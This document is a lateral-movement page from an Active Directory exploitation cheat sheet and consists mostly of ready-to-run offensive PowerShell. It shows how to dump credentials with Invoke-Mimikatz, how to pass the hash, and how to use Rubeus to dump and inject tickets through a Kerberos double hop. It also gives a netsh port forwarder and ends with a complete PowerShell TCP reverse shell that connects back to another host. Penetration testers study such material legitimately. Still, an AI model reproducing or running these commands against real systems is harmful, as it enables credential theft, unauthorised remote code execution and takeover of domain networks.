## LATERAL MOVEMENT

---
#### POWERSHELL REMOTING
- Execute commands or scriptblocks
```powershell
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```
- Execute scripts from files
```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```
- Execute locally loaded function on the remote machines
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```
- A function call within the script is used
```powershell
Invoke-Command -Filepath C:\path\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```
- "Stateful" commands using Invoke-Command
```powershell
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```
- Dump credentials on a local machine
```powershell
Invoke-Mimikatz -DumpCreds
```
- Dump credentials on multiple remote machines
```powershell
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```
- Over pass the hash
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:lab.domain.local /ntlm:<ntlmhash> /run:powershell.exe"'
```
- Invoke Mimikatz to create a token from user
```powershell
$sess = New-PSSession -ComputerName target.domain.local
Enter-PSSession $sess
# EP BYPASS + AMSI BYPASS
exit
# PUSH LOCAL SCRIPT TO SESSION
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession $sess
# DUMPING
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

---
#### FORWARDER
```powershell
# RULE
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.10.10 connectport=8080
# CHECK
netsh interface portproxy show all
# RESET
netsh interface portproxy reset
```

---
#### KERBEROS DOUBLE HOPS - Remote ticket dumping - SMB Lateral Hosting (skill)


- You are logged in to ServerA.
- From ServerA, you start a remote PowerShell session to connect to ServerB.
- A command you run on ServerB via your PowerShell Remoting session attempts to access a resource on ServerC.<br>

:no_entry: Access to the resource on ServerC is denied, because the credentials you used to create the PowerShell Remoting session are not passed from ServerB to ServerC.<br>
:no_entry: Cannot encapsulate multiple psremoting session.<br>
:no_entry: Delegation not available.<br>


```powershell
# LOGIN WITH COMPROMISED ACCOUNT
Invoke-Mimikatz -Command '"sekurlsa::pth /user:bob /domain:DOMAIN.LOCAL /ntlm:00000000000000000000000000000000 /run:powershell.exe"'

# PSREMOTE TO SERVER A
$servera = New-PSSession -ComputerName SERVERA.DOMAIN.LOCAL
Enter-PSSession -Session $servera

# PASS CREDENTIAL TO SERVER B
$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\alice', $SecPassword)
$serverb = New-PSSession -ComputerName SERVERB.DOMAIN.LOCAL -Credential $Cred

# LIST TICKET IN SERVER C:
Invoke-Command -ScriptBlock { & '\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe' klist} -Session $serverb | Select-String -Pattern Username

# DUMP TICKET IN SERVER C:
Invoke-Command -ScriptBlock { & '\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe' dump /user:targetadmin} -Session $serverb

# INJECT TICKET IN SERVER B:
Invoke-Command -ScriptBlock {& '\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe'  ptt /ticket:B64 } -Session $serverb

# CHECK INJECTION:
Invoke-Command -ScriptBlock { ls \\serverc\c$ } -Session $serverb

# RCE ON SERVER C:
Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {hostname} -ComputerName SERVERC.DOMAIN.LOCAL} -Session $serverb

# FINAL REVERSE SHELL IN SERVER A FROM SERVER C
Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient("servera",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -ComputerName SERVERC.DOMAIN.LOCAL} -Session $serverb 
```

---
[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)